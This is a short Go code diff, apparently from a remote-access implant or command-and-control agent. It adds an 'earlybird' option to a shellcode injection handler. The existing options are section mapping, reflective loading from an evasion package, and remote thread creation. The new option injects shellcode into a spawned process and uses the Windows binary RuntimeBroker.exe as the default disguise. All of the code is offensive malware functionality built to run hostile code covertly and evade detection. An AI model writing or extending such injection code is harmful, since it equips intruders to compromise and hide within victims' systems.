@@ -56,6 +56,12 @@ func HandleInject(ctx context.Context, env *agentRuntime.Env, cmdID string, payl
 		injectErr = injectMapSection(sc, pid)
 	case "reflectload":
 		injectErr = evasion.ReflectiveLoad(sc)
+	case "earlybird":
+		host, _ := payload["host"].(string)
+		if host == "" {
+			host = `C:\Windows\System32\RuntimeBroker.exe`
+		}
+		injectErr = evasion.EarlyBirdInject(sc, host)
 	default:
 		injectErr = injectCreateThread(sc, pid)
 	}
